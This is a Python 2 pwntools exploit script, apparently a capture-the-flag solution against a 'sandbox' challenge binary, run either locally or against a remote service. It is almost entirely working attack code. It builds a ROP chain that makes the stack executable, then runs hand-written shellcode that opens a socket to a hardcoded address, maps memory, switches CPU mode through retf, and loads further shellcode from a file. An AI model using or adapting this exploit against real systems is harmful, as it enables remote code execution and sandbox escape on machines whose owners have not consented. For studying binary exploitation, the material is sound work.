#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    # gdb_command = '''
    #     breakrva 0xe88
    #     c
    # '''
    gdb_command = '''
        b *0x450524
        c
    '''

    # 0x0000000000400686 : pop rdi ; ret
    # 0x0000000000450524 : push rsp ; ret
    # 0x00000000004150d4 : pop rax ; ret
    # 0x0000000000415f76 : mov qword ptr [rdi + 8], rax ; ret
    # 0x00000000004b4181 : pop qword ptr [rax] ; add ah, ch ; ret

    libc_stack_end = 0x6B8AB0
    prot = 0x6B8EF0
    dl_make_stack_executable = 0x47F780

    poprdi_addr = 0x400686
    pushrsp_addr = 0x450524
    poprax_addr = 0x4150d4
    mov_addr = 0x415f76
    popqword_addr = 0x4b4181

    rop = 'a' * 0x38
    rop += p64(poprax_addr) + p64(prot) + p64(popqword_addr) + p64(0x7)
    rop += p64(poprdi_addr) + p64(libc_stack_end) + p64(dl_make_stack_executable)
    rop += p64(pushrsp_addr)


    shellcode = asm('''
        mov al, 41
        cdq
        push 0x2
        pop rdi
        push 0x1
        pop rsi
        syscall

        mov al, 42
        mov dl, 16
        mov rsi, 0x2264fa0d1a250002
        push rsi
        mov rsi, rsp
        xor rdi, rdi
        syscall
    ''')
    shellcode += asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0x90000, 0x2000, 0x7, 0x22, -1, 0))
    shellcode += asm('''
        push 4
        pop rcx
        lea rsi, [rsp + 117]
        mov rdi, rax
        rep movs qword ptr [rdi], qword ptr [rsi]
    ''')
    shellcode += asm('''
        mov rsp, 0x6bb000
        mov r9, 0x2300090000
        push r9
        retf
    ''')
    # shellcode += 'fuckyou'
    shellcode += open('./shellcode1', 'r').read().rjust(24, '\x90')
    rop += shellcode
    log.info(len(rop))

    # if LOCAL:
    #     gdb.attach(r, gdb_command)
    r.sendline(rop)
    r.interactive()



if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    context.arch = 'amd64'
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('sandbox.chung96vn.cf', 1337)
        LOCAL = False
    elif sys.argv[1] == 'local':
        # r = process(['./sandbox','./program'])
        r = process('./program')
        LOCAL = True
    else:
        exit()
    exploit()
